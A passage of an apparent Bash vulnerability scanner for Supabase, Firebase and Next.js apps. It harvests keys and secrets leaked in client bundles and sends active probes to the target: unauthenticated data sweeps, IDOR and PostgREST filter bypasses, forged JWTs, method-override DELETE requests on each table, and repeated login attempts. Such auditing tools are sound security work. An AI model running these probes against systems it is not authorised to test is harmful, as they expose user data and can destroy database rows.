    python3 -c "
import json,sys
d=json.load(sys.stdin)
for s in d.get('secrets',[]):
    print(f'SECRET|{s[\"service\"]}|{s[\"value\"]}')
env=d.get('env',{})
for v in env.get('risky',[]):
    print(f'ENV_LEAK|{v}')
" 2>/dev/null <<< "$parsed" | while IFS='|' read -r kind svc val; do
        case "$kind" in
            SECRET)   vuln "Hardcoded ${svc} key in bundle: ${val}..."; log "SECRET:${svc}:${val}" ;;
            ENV_LEAK) warn "Server-only env var in client bundle: ${val}"; log "ENV_LEAK:${val}" ;;
        esac
    done

    # Source maps
    local sm; sm=$(grep -oP '//# sourceMappingURL=\S+' "$bundle_file" | head -1 2>/dev/null || true)
    [[ -n "$sm" ]] && { mcfg "Source map referenced in bundle: ${sm}"; log "SOURCE_MAP:${sm}"; }
}

# ─────────────────────────────────────────────────────────────────────────────
# PLATFORM DETECTION
# ─────────────────────────────────────────────────────────────────────────────
detect_platform() {
    section "PLATFORM & STACK DETECTION"
    local bundle_file="${OUT_DIR}/bundle.txt"
    local hdr_file="${OUT_DIR}/raw_headers.txt"
    hhead "$APP_URL" > "$hdr_file" 2>/dev/null || true

    python3 "${PYDIR}/platform.py" "$APP_URL" "$bundle_file" "$hdr_file" > "$PLATFORM_JSON" 2>/dev/null || echo '{}' > "$PLATFORM_JSON"

    python3 -c "
import json
d=json.load(open('${PLATFORM_JSON}'))
def show(lbl,items):
    if items:
        label=lbl+':'
        vals=', '.join(items)
        print(f'  {label:<20} {vals}')
show('Vibe platform',  d.get('vibe_platform',[]))
show('Frontend',       d.get('frontend',[]))
show('Backend/BaaS',   d.get('backend',[]))
show('ORM',            d.get('orm',[]))
show('Auth provider',  d.get('auth',[]))
show('Hosting',        d.get('hosting',[]))
show('API patterns',   d.get('api_patterns',[]))
creds=d.get('credentials',{})
if creds:
    print('  Credentials found:')
    for k,v in creds.items():
        crit='CRITICAL' if 'CRITICAL' in k else 'INFO'
        print(f'    [{crit}] {k}: {str(v)[:50]}')
" 2>/dev/null || true

    # Flag critical creds
    python3 -c "
import json
d=json.load(open('${PLATFORM_JSON}'))
for k,v in d.get('credentials',{}).items():
    if 'CRITICAL' in k: print(f'CRIT|{k}|{str(v)[:50]}')
    elif k in ['postgres_conn','firebase_api_key','convex_url']: print(f'WARN|{k}|{str(v)[:50]}')
" 2>/dev/null | while IFS='|' read -r sev key val; do
        case "$sev" in
            CRIT) vuln "Critical credential exposed in client bundle: ${key}"; log "CRED:CRIT:${key}" ;;
            WARN) warn "Credential in client bundle: ${key}"; log "CRED:WARN:${key}" ;;
        esac
    done

    log "PLATFORM:$(python3 -c "
import json
d=json.load(open('${PLATFORM_JSON}'))
items=d.get('vibe_platform',[])+d.get('backend',[])
print(','.join(items) or 'unknown')
" 2>/dev/null || echo unknown)"
}

get_platform_field() {
    python3 -c "
import json
try:
    d=json.load(open('${PLATFORM_JSON}'))
    items=d.get('$1',[])
    print(','.join(items) if isinstance(items,list) else str(items))
except: print('')
" 2>/dev/null || true
}


# ─────────────────────────────────────────────────────────────────────────────
# SWAGGER / SCHEMA DISCOVERY
# ─────────────────────────────────────────────────────────────────────────────
discover_swagger() {
    section "SWAGGER / OPENAPI DISCOVERY"
    SWAGGERSRC=()
    local candidates=(
        "${SUPABASE}/rest/v1/"
        "${APP_URL}/swagger.json"    "${APP_URL}/openapi.json"
        "${APP_URL}/api-docs"        "${APP_URL}/api-docs.json"
        "${APP_URL}/api/swagger.json" "${APP_URL}/swagger/v1/swagger.json"
    )
    for url in "${candidates[@]}"; do
        echo "$url" | grep -q "{SUPABASE_URL}" && continue
        local r; r=$(hprobe "GET" "$url"); local st="${r%%|||*}"; local bd="${r#*|||}"
        if [[ "$st" == "200" ]] && echo "$bd" | grep -qE '"swagger"|"openapi"|"paths"'; then
            ok "Found: $url"
            SWAGGERSRC+=("$url")
            echo "$bd" > "${OUT_DIR}/swagger_src.json"
            log "SWAGGER_URL:$url"
        fi
    done
    # PostgREST native schema
    if [[ "$SUPABASE" != "{SUPABASE_URL}" && -n "$ANON_KEY" ]]; then
        info "Fetching PostgREST OpenAPI schema..."
        local pg; pg=$(curl -sS --max-time "$TIMEOUT" -A "$UA" \
            -H "Accept: application/openapi+json" -H "apikey: ${ANON_KEY}" \
            "${SUPABASE}/rest/v1/" 2>/dev/null | tr -d '\000' || true)
        if [[ "$pg" == "{"* ]]; then
            ok "PostgREST schema: ${#pg} bytes"
            echo "$pg" > "$SCHEMA"
            SWAGGERSRC+=("${SUPABASE}/rest/v1/")
            log "POSTGREST_SCHEMA:obtained"
        fi
    fi
    [[ ${#SWAGGERSRC[@]} -eq 0 ]] && warn "No Swagger/OpenAPI endpoints found"
}

parse_schema() {
    [[ ! -f "$SCHEMA" ]] && return
    section "SCHEMA PARSING"
    local pout="${OUT_DIR}/parsed_schema.json"
    python3 "${PYDIR}/schema.py" "$SCHEMA" "$pout" 2>/dev/null | while IFS=: read -r _ tname rest; do
        verb "  → ${tname} (${rest})"
    done
    [[ -f "$pout" ]] && {
        local new_tables; readarray -t new_tables < <(python3 -c "
import json
d=json.load(open('${pout}'))
for t in d: print(t)
" 2>/dev/null || true)
        for t in "${new_tables[@]}"; do
            printf '%s\n' "${TABLES[@]}" | grep -qx "$t" 2>/dev/null || TABLES+=("$t")
        done
        ok "Schema: $(python3 -c "import json; print(len(json.load(open('${pout}'))))" 2>/dev/null || echo 0) table(s)"
    }
}

build_endpoint_map() {
    section "ENDPOINT MAP"
    : > "$ENDPOINTS"
    local base="$SUPABASE"; [[ "$base" == "{SUPABASE_URL}" ]] && base=""

    for t in "${TABLES[@]}"; do
        for m in GET POST PATCH DELETE; do
            echo "${m}|${base}/rest/v1/${t}|supabase-rest|table:${t}" >> "$ENDPOINTS"
        done
    done
    for r in "${RPCS[@]}";   do echo "POST|${base}/rest/v1/rpc/${r}|supabase-rpc|rpc:${r}"   >> "$ENDPOINTS"; done
    for e in "${EDGES[@]}";  do echo "POST|${base}/functions/v1/${e}|supabase-edge|edge:${e}" >> "$ENDPOINTS"; done

    local auth_eps=(
        "POST|${base}/auth/v1/signup|supabase-auth|auth"
        "POST|${base}/auth/v1/token?grant_type=password|supabase-auth|auth"
        "GET|${base}/auth/v1/user|supabase-auth|auth"
        "PUT|${base}/auth/v1/user|supabase-auth|auth"
        "POST|${base}/auth/v1/recover|supabase-auth|auth"
        "GET|${base}/auth/v1/settings|supabase-auth|auth"
        "GET|${base}/auth/v1/admin/users|supabase-auth|auth-admin"
        "GET|${base}/auth/v1/admin/audit_log|supabase-auth|auth-admin"
    )
    for ep in "${auth_eps[@]}"; do echo "$ep" >> "$ENDPOINTS"; done

    for b in "${BUCKETS[@]}"; do
        echo "GET|${base}/storage/v1/bucket/${b}|supabase-storage|bucket:${b}"      >> "$ENDPOINTS"
        echo "POST|${base}/storage/v1/object/list/${b}|supabase-storage|bucket:${b}" >> "$ENDPOINTS"
    done
    echo "GET|${base}/storage/v1/bucket|supabase-storage|storage" >> "$ENDPOINTS"

    for ep in "${APICALLS[@]}"; do
        local m="${ep%%||*}"; local p="${ep#*||}"
        [[ "$p" == http* ]] && echo "${m}|${p}|api-call|api"            >> "$ENDPOINTS" \
                            || echo "${m}|${APP_URL}${p}|api-call|api"   >> "$ENDPOINTS"
    done
    for r in "${ROUTES[@]}";   do echo "GET|${APP_URL}${r}|spa-route|spa"   >> "$ENDPOINTS"; done
    for sw in "${SWAGGERSRC[@]}"; do echo "GET|${sw}|swagger|openapi"        >> "$ENDPOINTS"; done

    sort -u "$ENDPOINTS" -o "$ENDPOINTS" 2>/dev/null || true
    local total; total=$(wc -l < "$ENDPOINTS" 2>/dev/null || echo 0)
    readarray -t ALLEPS < "$ENDPOINTS"
    ok "Endpoint map: ${total} entries"
}

# ─────────────────────────────────────────────────────────────────────────────
# STATIC ANALYSIS — JWT
# ─────────────────────────────────────────────────────────────────────────────
analyse_jwt() {
    section "JWT ANALYSIS"
    [[ -z "$ANON_KEY" ]] && { warn "No anon key found"; return; }

    local out; out=$(python3 "${PYDIR}/jwt.py" "$ANON_KEY" 2>/dev/null || true)
    echo "$out" | grep -v "^__" || true
    local role; role=$(echo "$out" | grep "^__ROLE__=" | cut -d= -f2)
    local exp;  exp=$(echo "$out"  | grep "^__EXP__="  | cut -d= -f2)
    [[ "$exp" == "no" ]]          && vuln "anon key has NO expiry — permanent token"
    [[ "$role" == "service_role" ]] && vuln "SERVICE ROLE key in client bundle — full database access!"
}


# ─────────────────────────────────────────────────────────────────────────────
# ACTIVE SECURITY TESTS
# ─────────────────────────────────────────────────────────────────────────────
audit_headers() {
    section "SECURITY HEADERS & CORS AUDIT"
    local raw; raw=$(hhead "$APP_URL")
    local hdr="${raw,,}"

    # Required headers
    for h in "Content-Security-Policy" "Strict-Transport-Security" \
             "X-Frame-Options" "X-Content-Type-Options" \
             "Referrer-Policy" "Permissions-Policy"; do
        if echo "$hdr" | grep -qi "^${h,,}:"; then
            ok "${h}: present"
        else
            warn "${h}: MISSING"
            case "$h" in
                "Content-Security-Policy") mcfg "CSP header missing — XSS mitigations absent" ;;
                "Strict-Transport-Security") mcfg "HSTS missing — downgrade attack risk" ;;
                "X-Frame-Options") mcfg "X-Frame-Options missing — clickjacking risk" ;;
            esac
        fi
    done

    # CSP quality
    local csp; csp=$(echo "$raw" | grep -i "^Content-Security-Policy:" | head -1 || true)
    echo "$csp" | grep -q "unsafe-inline" && mcfg "CSP allows 'unsafe-inline'"
    echo "$csp" | grep -q "unsafe-eval"   && mcfg "CSP allows 'unsafe-eval'"

    # HSTS quality
    local hsts; hsts=$(echo "$raw" | grep -i "^Strict-Transport-Security:" | head -1 || true)
    if [[ -n "$hsts" ]]; then
        local ma; ma=$(echo "$hsts" | grep -oP 'max-age=\K[0-9]+' || echo 0)
        [[ "$ma" -lt 31536000 ]] && mcfg "HSTS max-age too short (${ma}s < 31536000)"
    fi

    # Server info disclosure
    local srv; srv=$(echo "$raw" | grep -i "^Server:" | head -1 || true)
    local xpb; xpb=$(echo "$raw" | grep -i "^X-Powered-By:" | head -1 || true)
    [[ -n "$srv" ]] && echo "$srv" | grep -qP '\d+\.\d+' && mcfg "Server header discloses version: ${srv}"
    [[ -n "$xpb" ]] && mcfg "X-Powered-By discloses tech: ${xpb}"

    # HTTP → HTTPS
    if [[ "$APP_URL" == https://* ]]; then
        local hs; hs=$(hstatus "${APP_URL/https:\/\//http:\/\/}")
        [[ "$hs" == "200" ]] && mcfg "HTTP (port 80) accessible without redirect to HTTPS"
    fi

    # CORS
    if [[ "$SUPABASE" != "{SUPABASE_URL}" && -n "$ANON_KEY" ]]; then
        local cors; cors=$(curl -sS --max-time "$TIMEOUT" -A "$UA" \
            -H "Origin: https://evil.example.com" -H "apikey: ${ANON_KEY}" \
            -I "${SUPABASE}/rest/v1/" 2>/dev/null | tr -d '\000' || true)
        local acao; acao=$(echo "$cors" | grep -i "access-control-allow-origin:" | head -1 || true)
        local acac; acac=$(echo "$cors" | grep -i "access-control-allow-credentials:" | head -1 || true)
        if echo "$acao" | grep -q '\*'; then
            vuln "CORS wildcard (*) on Supabase — any origin can call the API!"; log "CORS:WILDCARD"
        elif echo "$acao" | grep -qi "evil.example.com"; then
            if echo "$acac" | grep -qi "true"; then
                vuln "CORS reflects arbitrary origin WITH credentials — critical data theft risk!"; log "CORS:REFLECT_CREDS"
            else
                mcfg "CORS reflects arbitrary origin (without credentials)"
            fi
        else
            ok "CORS: properly restricted"
        fi

        # Auth settings exposure
        local as_r; as_r=$(hprobe "GET" "${SUPABASE}/auth/v1/settings")
        local as_st="${as_r%%|||*}"; local as_bd="${as_r#*|||}"
        if [[ "$as_st" == "200" ]]; then
            mcfg "Auth settings publicly readable: /auth/v1/settings"
            log "AUTH_SETTINGS:exposed"
            python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    if d.get('mailer_autoconfirm'): print('[!] mailer_autoconfirm=true — no email verification!')
    if not d.get('disable_signup',True): print('[!] disable_signup=false — open registration!')
except: pass
" <<< "$as_bd" 2>/dev/null | while read -r line; do warn "$line"; done
        fi
    fi

    # Source map live check
    local main_js; main_js=$(hget "${APP_URL}/" | grep -oP '/assets/[^"'"'"'` \t\n]+\.js' | head -1 2>/dev/null || true)
    if [[ -n "$main_js" ]]; then
        local map_st; map_st=$(hstatus "${APP_URL}${main_js}.map")
        [[ "$map_st" == "200" ]] && mcfg "Source map accessible: ${APP_URL}${main_js}.map"
    fi

    ok "Header audit complete — ${#MCFGS[@]} misconfiguration(s) found"
    # Save headers for OWASP scanner
    echo "$raw" > "${OUT_DIR}/raw_headers.txt"
}

sweep_unauth() {
    section "UNAUTHENTICATED ACCESS SWEEP"
    local open=0
    printf "  %-6s %-6s %-65s\n" "STATUS" "METHOD" "ENDPOINT"
    printf "  %s\n" "────────────────────────────────────────────────────────────────────────────────"
    while IFS='|' read -r method url source tag; do
        [[ -z "$method" || -z "$url" ]] && continue
        local r; r=$(hprobe_no "$method" "$url")
        local st="${r%%|||*}"; local bd="${r#*|||}"
        local flag="" color="$DIM"
        case "$st" in
            200|201)
                if [[ "$bd" == "[]" ]]; then color="$GREEN"; flag="empty(RLS?)"
                elif [[ ${#bd} -gt 5 ]]; then
                    color="$LRED"; flag="DATA"; open=$((open+1))
                    vuln "Unauth ${method} ${url}: data returned"; log "UNAUTH:${method}:${url}"
                fi ;;
            204)     color="$YELLOW"; flag="no-content" ;;
            401|403) color="$GREEN";  flag="protected" ;;
            404)     color="$DIM";    flag="not found" ;;
            429)     color="$CYAN";   flag="rate-limited" ;;
            *)       flag="http ${st}" ;;
        esac
        local short; short="${url#*//*/}"; [[ ${#short} -gt 65 ]] && short="${short:0:62}..."
        echo -e "  ${color}${st}    ${method:0:6}  ${short:0:65} ${flag}${NC}"
    done < "$ENDPOINTS"
    [[ $open -eq 0 ]] && ok "No unauthenticated data leaks" || warn "${open} open endpoint(s)"
}

test_idor() {
    section "IDOR / BOLA TESTING"
    [[ "$SUPABASE" == "{SUPABASE_URL}" ]] && return
    local uuid="00000000-0000-0000-0000-000000000001"
    for tbl in "${TABLES[@]}"; do
        local url="${SUPABASE}/rest/v1/${tbl}"
        for filter in "id=eq.${uuid}" "user_id=eq.${uuid}" "owner_id=eq.${uuid}"; do
            local r; r=$(hprobe "GET" "${url}?${filter}&select=*")
            local st="${r%%|||*}"; local bd="${r#*|||}"
            [[ "$st" == "200" && "$bd" != "[]" && ${#bd} -gt 5 ]] && \
                warn "IDOR: '${tbl}' leaks via ?${filter}" && log "IDOR:${tbl}:${filter}"
        done
        # OR bypass
        local ro; ro=$(hprobe "GET" "${url}?id=eq.x&or=(id.gt.0)&select=*&limit=3")
        local ro_st="${ro%%|||*}"; local ro_bd="${ro#*|||}"
        [[ "$ro_st" == "200" && "$ro_bd" != "[]" && ${#ro_bd} -gt 5 ]] && \
            vuln "PostgREST OR bypass on '${tbl}'" && log "POSTGREST_OR:${tbl}"
        # Row count
        local rc; rc=$(hprobe "GET" "${url}?select=count" "Prefer: count=exact")
        [[ "${rc%%|||*}" == "200" ]] && verb "'${tbl}': row count enumerable"
        # CSV
        local csv; csv=$(curl -sS --max-time "$TIMEOUT" -A "$UA" \
            -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" \
            -H "Accept: text/csv" "${url}?select=*&limit=5" 2>/dev/null | tr -d '\000' || true)
        [[ "$csv" == *","* && ${#csv} -gt 20 ]] && warn "'${tbl}': CSV export available" && log "CSV_EXPORT:${tbl}"
    done
    ok "IDOR sweep complete"
}

test_jwt_attacks() {
    section "JWT ATTACK SURFACE"
    [[ -z "$ANON_KEY" ]] && return
    local variants; variants=$(python3 "${PYDIR}/jwt_atk.py" "$ANON_KEY" 2>/dev/null || true)
    [[ -z "$variants" ]] && return
    local test_url="${SUPABASE}/rest/v1/${TABLES[0]:-}"
    [[ -z "${TABLES[0]:-}" ]] && test_url="${SUPABASE}/auth/v1/user"
    while IFS='|' read -r vname tok; do
        [[ -z "$tok" ]] && continue
        local st; st=$(curl -sS --max-time "$TIMEOUT" -A "$UA" -o /dev/null -w "%{http_code}" \
                        -H "apikey: ${tok}" -H "Authorization: Bearer ${tok}" \
                        -H "Accept: application/json" "$test_url" 2>/dev/null || echo "000")
        if [[ "$st" == "200" ]]; then
            vuln "JWT attack '${vname}' accepted!"; log "JWT_ATTACK:${vname}"
        else
            ok "JWT '${vname}': rejected (${st})"
        fi
    done <<< "$variants"
}

test_method_override() {
    section "HTTP METHOD OVERRIDE"
    [[ "$SUPABASE" == "{SUPABASE_URL}" ]] && return
    for tbl in "${TABLES[@]}"; do
        local url="${SUPABASE}/rest/v1/${tbl}"
        local st; st=$(curl -sS --max-time "$TIMEOUT" -A "$UA" -o /dev/null -w "%{http_code}" \
            -X POST -H "X-HTTP-Method-Override: DELETE" \
            -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${ANON_KEY}" \
            -H "Content-Type: application/json" "$url" 2>/dev/null || echo "000")
        [[ "$st" == "200" || "$st" == "204" ]] && \
            vuln "X-HTTP-Method-Override: DELETE accepted on '${tbl}'" && log "METHOD_OVERRIDE:${tbl}"
    done
    ok "Method override sweep complete"
}

test_rate_limit() {
    section "RATE LIMIT DETECTION"
    [[ "$SUPABASE" == "{SUPABASE_URL}" ]] && return
    local eps=(
        "POST|${SUPABASE}/auth/v1/token?grant_type=password|login"
        "POST|${SUPABASE}/auth/v1/signup|signup"
        "POST|${SUPABASE}/auth/v1/recover|recover"
    )
    for entry in "${eps[@]}"; do
        local method="${entry%%|*}"; local rest="${entry#*|}"; local url="${rest%%|*}"; local label="${rest##*|}"
        local blocked=false
        for _ in 1 2 3 4 5 6 7 8 9 10; do
            local st; st=$(curl -o /dev/null -sS --max-time 5 -A "$UA" -X "$method" \
                 -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
                 -d '{"email":"rl@t.invalid","password":"wrongpass"}' \
                 -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            [[ "$st" == "429" ]] && { ok "Rate-limited on ${label}"; blocked=true; break; }
        done
        $blocked || vuln "No rate limiting on ${label} after 10 requests"
    done
}

test_storage() {
    section "STORAGE BUCKET ANALYSIS"
    [[ "$SUPABASE" == "{SUPABASE_URL}" ]] && return
    local r; r=$(hprobe "GET" "${SUPABASE}/storage/v1/bucket")
    local st="${r%%|||*}"; local bd="${r#*|||}"
    [[ "$st" == "200" ]] && { mcfg "Bucket list accessible with anon key"; log "BUCKET_LIST:exposed"; }
    for bucket in "${BUCKETS[@]}"; do
        local ru; ru=$(hprobe "POST" "${SUPABASE}/storage/v1/object/list/${bucket}" "" '{"prefix":"","limit":10}')
        local su="${ru%%|||*}"; local bu="${ru#*|||}"
        if [[ "$su" == "200" ]]; then
            local cnt; cnt=$(python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null <<< "$bu" || echo 0)
            [[ "$cnt" -gt 0 ]] && vuln "Storage '${bucket}': ${cnt} files exposed" && log "OPEN_BUCKET:${bucket}"
        fi
    done
}

# ─────────────────────────────────────────────────────────────────────────────
# PLATFORM-SPECIFIC SCANNERS
# ─────────────────────────────────────────────────────────────────────────────
scan_firebase() {
    section "FIREBASE SECURITY SCAN"
    local api_key proj_id storage_bucket fb_out
    api_key=$(python3 -c "import json; d=json.load(open('${PLATFORM_JSON}')); print(d.get('credentials',{}).get('firebase_api_key',''))" 2>/dev/null || true)
    proj_id=$(python3 -c "import json; d=json.load(open('${PLATFORM_JSON}')); print(d.get('credentials',{}).get('firebase_project_id',''))" 2>/dev/null || true)
    storage_bucket=$(python3 -c "import json; d=json.load(open('${PLATFORM_JSON}')); print(d.get('credentials',{}).get('firebase_storage_bucket',''))" 2>/dev/null || true)
    [[ -z "$proj_id" ]] && { warn "No Firebase project ID found — skipping"; return; }
    info "Firebase project: ${proj_id}"
    fb_out="${OUT_DIR}/firebase_scan.json"
    python3 "${PYDIR}/firebase.py" "$api_key" "$proj_id" "$storage_bucket" "$fb_out" 2>/dev/null || true
    python3 -c "
import json
d=json.load(open('${fb_out}'))
for v in d.get('vulns',[]): print('VULN|'+v)
for i in d.get('info',[]):  print('INFO|'+i)
" 2>/dev/null | while IFS='|' read -r kind msg; do
        [[ "$kind" == "VULN" ]] && vuln "$msg" && log "FIREBASE:$msg"
        [[ "$kind" == "INFO" ]] && info "$msg"
    done
}

scan_nextjs() {
    section "NEXT.JS / VERCEL SECURITY SCAN"
    local bundle_file="${OUT_DIR}/bundle.txt"; local nj_out="${OUT_DIR}/nextjs_scan.json"
    python3 "${PYDIR}/nextjs.py" "$APP_URL" "$bundle_file" "$nj_out" 2>/dev/null || true
    python3 -c "
import json
d=json.load(open('${nj_out}'))
for v in d.get('vulns',[]): print('VULN|'+v)
for i in d.get('info',[]):  print('INFO|'+i)
for v in d.get('env_leaks',[]): print('VULN|Env var in client bundle: '+v)
" 2>/dev/null | while IFS='|' read -r kind msg; do
        [[ "$kind" == "VULN" ]] && vuln "$msg" && log "NEXTJS:$msg"
        [[ "$kind" == "INFO" ]] && info "$msg"
    done
}

scan_graphql() {
    section "GRAPHQL SECURITY SCAN"
    local gql_out="${OUT_DIR}/graphql_scan.json"
    python3 "${PYDIR}/graphql.py" "$APP_URL" "$gql_out" 2>/dev/null || true
    python3 -c "
import json
d=json.load(open('${gql_out}'))
for v in d.get('vulns',[]): print('VULN|'+v)
for i in d.get('info',[]):  print('INFO|'+i)
if d.get('operations'): print(f'INFO|GraphQL operations: {len(d[\"operations\"])}')
" 2>/dev/null | while IFS='|' read -r kind msg; do
        [[ "$kind" == "VULN" ]] && vuln "$msg" && log "GRAPHQL:$msg"
        [[ "$kind" == "INFO" ]] && info "$msg"
    done
}

scan_api_fuzz() {
    section "API DISCOVERY & FUZZING"
    local bundle_file="${OUT_DIR}/bundle.txt"; local af_out="${OUT_DIR}/apifuzz.json"
    python3 "${PYDIR}/apifuzz.py" "$APP_URL" "$bundle_file" "$af_out" 2>/dev/null || echo '{"vulns":[],"info":[],"endpoints":[]}' > "$af_out"
    python3 -c "
import json
d=json.load(open('${af_out}'))
for v in d.get('vulns',[]): print('VULN|'+v)
eps=[e for e in d.get('endpoints',[]) if e.get('accessible')]
print(f'INFO|Accessible API endpoints: {len(eps)}')
for e in eps[:20]:
    ex=''
    if e.get('pii'):             ex+=' [PII!]'
    if e.get('error_disclosure'):ex+=' [ERROR_LEAK!]'
    if e.get('row_count'):       ex+=f' [{e[\"row_count\"]} rows]'
    print(f'INFO|  HTTP 200: {e[\"path\"]}{ex}')
" 2>/dev/null | while IFS='|' read -r kind msg; do
        [[ "$kind" == "VULN" ]] && vuln "$msg" && log "APIFUZZ:$msg"
        [[ "$kind" == "INFO" ]] && info "$msg"
    done
}

scan_injections() {
    if ! $ENABLE_INJECTION; then
        info "Injection tests disabled (use --enable-injection to activate)"
        return
    fi
    section "INJECTION TESTING — SQLi · NoSQLi · SSTI · CMDi (OWASP A03)"
    local af_out="${OUT_DIR}/apifuzz.json"; local inj_out="${OUT_DIR}/injection.json"
    [[ ! -f "$af_out" ]] && { warn "No endpoint list — run API fuzzer first"; return; }
    python3 -c "import json; d=json.load(open('${af_out}')); print(json.dumps(d.get('endpoints',[])))" 2>/dev/null > "${OUT_DIR}/ep_list.json"
    python3 "${PYDIR}/inject.py" "$APP_URL" "${OUT_DIR}/ep_list.json" "$inj_out" 2>/dev/null || true
    python3 -c "
import json
d=json.load(open('${inj_out}'))
for v in d.get('vulns',[]): print('VULN|'+v)
" 2>/dev/null | while IFS='|' read -r kind msg; do
        [[ "$kind" == "VULN" ]] && vuln "$msg" && log "INJECTION:$msg"
    done
}

scan_traversal() {
    section "PATH TRAVERSAL TESTING (OWASP A01)"
    local cl_out="${OUT_DIR}/classified.json"
    local tr_out="${OUT_DIR}/traversal.json"
    if [[ ! -f "$cl_out" ]]; then
        warn "No classified endpoints — path traversal skipped"
        return
    fi
    local budget=60; $FULL && budget=120
    python3 "${PYDIR}/traversal.py" "$cl_out" "$tr_out" "$budget" 2>/dev/null || true
    [[ -f "$tr_out" ]] && python3 -c "
import json
d = json.load(open('${tr_out}'))
tested  = d.get('tested', 0)
skipped = d.get('skipped', 0)
print(f'INFO|Traversal: {tested} tests, {skipped} endpoints skipped (not file-serving)')
for v in d.get('vulns', []): print('VULN|' + v)
" 2>/dev/null | while IFS='|' read -r kind msg; do
        [[ "$kind" == "VULN" ]] && vuln "$msg" && log "TRAVERSAL:$msg"
        [[ "$kind" == "INFO" ]] && info "$msg"
    done
}

scan_ssrf() {
    if ! $ENABLE_SSRF; then
        info "SSRF tests disabled — use --enable-ssrf to activate"
        return
    fi
    section "SSRF TESTING (OWASP A10)"
    local cl_out="${OUT_DIR}/classified.json"
    local ssrf_out="${OUT_DIR}/ssrf.json"
    if [[ ! -f "$cl_out" ]]; then
        warn "No classified endpoints — SSRF skipped"
        return
    fi
    local budget=45; $FULL && budget=90
    python3 "${PYDIR}/ssrf.py" "$cl_out" "$ssrf_out" "$budget" 2>/dev/null || true
    [[ -f "$ssrf_out" ]] && python3 -c "
import json
d = json.load(open('${ssrf_out}'))
tested = d.get('tested', 0)
print(f'INFO|SSRF: {tested} combinations tested')
for v in d.get('vulns', []): print('VULN|' + v)
for i in d.get('info',  []):
    if isinstance(i, str): print('INFO|' + i)
" 2>/dev/null | while IFS='|' read -r kind msg; do
        [[ "$kind" == "VULN" ]] && vuln "$msg" && log "SSRF:$msg"
        [[ "$kind" == "INFO" ]] && info "$msg"
    done
}

scan_owasp() {
    section "OWASP TOP 10 + WSTG COMPREHENSIVE AUDIT"
    local hdr_file="${OUT_DIR}/raw_headers.txt"; local bundle_file="${OUT_DIR}/bundle.txt"
    local owasp_out="${OUT_DIR}/owasp.json"
    [[ ! -f "$hdr_file" ]] && hhead "$APP_URL" > "$hdr_file" 2>/dev/null || true
    python3 "${PYDIR}/owasp.py" "$APP_URL" "$hdr_file" "$bundle_file" "$owasp_out" 2>/dev/null || true

    python3 -c "
import json
d=json.load(open('${owasp_out}'))
for f in d.get('findings',[]):
    sev=f.get('severity','?'); title=f.get('title','?')
    owasp=f.get('owasp','?'); mitre=f.get('mitre','?')
    wstg=f.get('wstg','?'); cvss=f.get('cvss_score',0)
    print(f'{sev}|{title}|{owasp}|{mitre}|{wstg}|{cvss}')
s=d.get('summary',{})
print(f'SUMMARY|CRIT:{s.get(\"CRITICAL\",0)} HIGH:{s.get(\"HIGH\",0)} MED:{s.get(\"MEDIUM\",0)} LOW:{s.get(\"LOW\",0)}')
" 2>/dev/null | while IFS='|' read -r sev rest; do
        local title owasp mitre wstg cvss
        title=$(echo "$rest" | cut -d'|' -f1)
        owasp=$(echo "$rest" | cut -d'|' -f2)
        mitre=$(echo "$rest" | cut -d'|' -f3)
        wstg=$(echo "$rest" | cut -d'|' -f4)
        cvss=$(echo "$rest" | cut -d'|' -f5)
        case "$sev" in
            CRITICAL|HIGH) vuln "[${sev}] ${title} — ${owasp} | ${mitre} | CVSS:${cvss}"; log "OWASP:${sev}:${title}" ;;
            MEDIUM)        mcfg "[MEDIUM] ${title} — ${wstg}" ;;
            LOW|INFO)      info "[${sev}] ${title}" ;;
            SUMMARY)       info "OWASP summary: ${rest}" ;;
        esac
    done
}

# ─────────────────────────────────────────────────────────────────────────────
# ENDPOINT CLASSIFIER — runs before any active tests
# ─────────────────────────────────────────────────────────────────────────────
scan_classify() {
    section "ENDPOINT CLASSIFICATION"
    local cl_out="${OUT_DIR}/classified.json"
    local af_out="${OUT_DIR}/apifuzz.json"

    [[ ! -f "$ENDPOINTS" ]] && { warn "No endpoint map yet"; return; }
    [[ ! -f "$af_out"    ]] && echo '{"endpoints":[]}' > "$af_out"

    python3 "${PYDIR}/classify.py" "$ENDPOINTS" "$af_out" "$cl_out" 2>/dev/null ||         echo '{"traversal_candidates":[],"injection_candidates":[],"ssrf_candidates":[],"xss_candidates":[]}' > "$cl_out"

    if [[ -f "$cl_out" ]]; then
        python3 -c "
import json
d = json.load(open('${cl_out}'))
total = d.get('total_classified', 0)
cats  = d.get('by_category', {})
tr    = len(d.get('traversal_candidates', []))
inj   = len(d.get('injection_candidates', []))
ssrf  = len(d.get('ssrf_candidates', []))
xss   = len(d.get('xss_candidates', []))
print(f'INFO|Classified {total} endpoints')
for cat, cnt in sorted(cats.items(), key=lambda x: -x[1])[:8]:
    print(f'INFO|  {cat:<25} {cnt}')
print(f'INFO|Test candidates: traversal={tr}  injection={inj}  ssrf={ssrf}  xss={xss}')
" 2>/dev/null | while IFS='|' read -r kind msg; do
            [[ "$kind" == "INFO" ]] && info "$msg"
        done
    fi
}


# ─────────────────────────────────────────────────────────────────────────────
# PLATFORM DISPATCHER
# ─────────────────────────────────────────────────────────────────────────────
scan_platform_specific() {
    section "PLATFORM-SPECIFIC SECURITY SCANS"
    local backends; backends=$(get_platform_field "backend")
    local frontend; frontend=$(get_platform_field "frontend")
    local apis;     apis=$(get_platform_field "api_patterns")

    # Step 1: Platform-specific scanners (Firebase, Next.js, GraphQL)
    echo "$backends" | grep -qi "firebase" && scan_firebase || true
    echo "$frontend" | grep -qi "nextjs"   && scan_nextjs   || true
    echo "$apis"     | grep -qi "graphql"  && scan_graphql  || true

    # Step 2: Generic API discovery (populates apifuzz.json)
    scan_api_fuzz

    # Step 3: Classify all endpoints before any active testing
    #         This decides WHICH endpoints are worth testing for each vector
    scan_classify

    # Step 4: Active tests — each reads classified.json for smart targeting
    scan_injections   # Only api-dynamic and admin endpoints
    scan_traversal    # Only file-serving endpoints
    scan_ssrf         # Only url-fetching endpoints (webhook, redirect params)
    scan_owasp        # Header + config checks (not endpoint-dependent)
}


# ─────────────────────────────────────────────────────────────────────────────
# DATABASE & USER INTELLIGENCE
